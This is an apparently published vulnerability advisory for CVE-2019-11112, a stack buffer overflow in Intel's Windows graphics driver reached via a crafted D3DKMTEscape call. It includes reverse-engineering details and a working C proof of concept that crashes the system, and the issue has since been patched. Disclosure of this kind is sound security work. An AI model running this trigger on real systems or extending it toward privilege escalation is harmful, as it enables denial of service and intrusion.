# SSD Advisory – Intel Windows Graphics Driver Buffer Overflow to Privilege Escalation66

## Vulnerability Summary
The igdkmd64 module in the Intel Graphics Driver DCH on Windows allows local users to gain Escalation of Privileges or cause Denial of Service (crash) via a crafted D3DKMTEscape request.

## CVE
CVE-2019-11112

## Credit
SSD Secure Disclosure / Ori Nimron

## Affected Systems
Tested on Intel Graphics Driver DCH 25.20.100.6323 and on 25.20.100.6577 (latest at the time of writing this report), on Windows 10 Version 1809.

## Vendor Response
Intel fixed the issue in versions 26.20.100.6813 and 26.20.100.6812 of the Intel(R) Graphics Driver. For more information see [2019.2 IPU](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00242.html).

## Vulnerability Details
The driver’s callback function DxgkDdiEscape contains a memory corruption vulnerability that can be triggered by local users can trigger the vulnerability by crafting a malicious request to the D3DKMTEscape function.   
In DxgkDdiEscape, there is a global variable (which I named as “escape_jmp_table”) which is an array of pointers to functions. The function will choose which function to call based on the value of the third parameter of the privateDriverData value that is controlled by the local user.  
The structure of privateDriverData looks something like this:
``` c
typedef struct {
	UINT unknown1;
	UINT unknown2;
	UINT escape_jmp_table_index;
	UINT switchcase_index;
	char buffer[100];
} privateDriverData;
```

The DxgkDdiEscape will call to sub_14004FCE0 (which I will name it as ESCAPE_CONTINUE_TO_TABLE). The ESCAPE_CONTINUE_TO_TABLE will load the “escape_jmp_table” and will call the function to which escape_jmp_table[pPrivateDriverData.escape_jmp_table_index] points to.
![Ida 1](https://ssd-disclosure.com/wp-content/uploads/2019/06/Intel-Driver-Ida-1.png)

The vulnerability discovered lies in the function being called by the pointer found by the value of the second index of the escape_jmp_table. This function (sub_140085E70) does a switch case on the fourth parameter of the privateDriverData and decides to which function to call by the value given.  
This image shows the various switch case handling this function (sub_140085E70) supports:
![Ida 2](https://ssd-disclosure.com/wp-content/uploads/2019/06/Intel-Driver-Ida-2-1024x206.png)

In case that the value of the fourth parameter in the structure is 205, the function the sub_140092E80 will be called:
![Ida 3](https://ssd-disclosure.com/wp-content/uploads/2019/06/Intel-Driver-Ida-3.png)

This function allocates a buffer on the stack and calls sub_1400AD9F0 with this buffer, I will name this buffer as local_buf:
![Ida 4](https://ssd-disclosure.com/wp-content/uploads/2019/06/Intel-Driver-Ida-4.png)

The subsequent function sub_1400AD9F0 does a memcpy(pPrivateDriverData.buffer + 0xb, 0x200, localbuf + 0xb, 0x200).  
The memcpy is called with a fixed size, no checks on the pPrivateDriverData buffer size, which means that if pPrivateDriverData.buffer length is smaller than 0x200 + 0xb, an overflow will be triggered. This overflow can lead to Escalation of Privileges (by utilizing a null pointer dereference exploitation method) or local Denial of Service.
![Ida 5](https://ssd-disclosure.com/wp-content/uploads/2019/06/Intel-Driver-Ida-5.png)

## Proof of Concept
The following PoC calls the D3DKMTEscape function with previously mentioned parameters that will trigger the vulnerable function and the system will crush due to security cookie check failure. The full code is in the Escape directory which contains a visual studio solution:

``` c
#define BUF_SIZE 100

static const char* intel = "Intel";

typedef struct {
	UINT unknown1;
	UINT unknown2;
	UINT escape_jmp_table_index;
	UINT switchcase_index;
	char buffer[BUF_SIZE];
} PrivateDriverData;

int main()
{
	int result = 0;
	DRIVER_INFO driverInfo = { 0 };
	D3DKMT_ESCAPE escapeObj = { 0 };
	PrivateDriverData data = { 0 };
	int status = initDriver(&driverInfo, intel);
	if (!NT_SUCCESS(status)) {
		printf("Could not initialize connection to driver");
		return -1;
	}
	printf("[+] Initialized driver\n");
	escapeObj.Type = D3DKMT_ESCAPE_DRIVERPRIVATE;
	escapeObj.hAdapter = driverInfo.hAdapter;
	escapeObj.hDevice = (D3DKMT_HANDLE)NULL;
	data.unknown1 = 'AAAA';
	data.unknown2 = 'BBBB';
	data.escape_jmp_table_index = 1;
	data.switchcase_index = 205; // vulnerable case
	memset(data.buffer, 'A', BUF_SIZE);

	escapeObj.pPrivateDriverData = (void*)&data;
	escapeObj.PrivateDriverDataSize = sizeof(data);
	status = D3DKMTEscape(&escapeObj); // Will not return, it will crash the system.
	if (!NT_SUCCESS(status)) {
		printf("[-] D3DKMTEscape failed (%x)", status);
	}
	getchar();
	return 0;
}
```

## Result in WinDbg
![WinDbg 1](https://ssd-disclosure.com/wp-content/uploads/2019/06/Intel-Driver-Windbg-1.png)
![WinDbg 2](https://ssd-disclosure.com/wp-content/uploads/2019/06/Intel-Driver-Windbg-2.png)

We can see in the above screenshot that a buffer overflow occurred, and the system crashes.
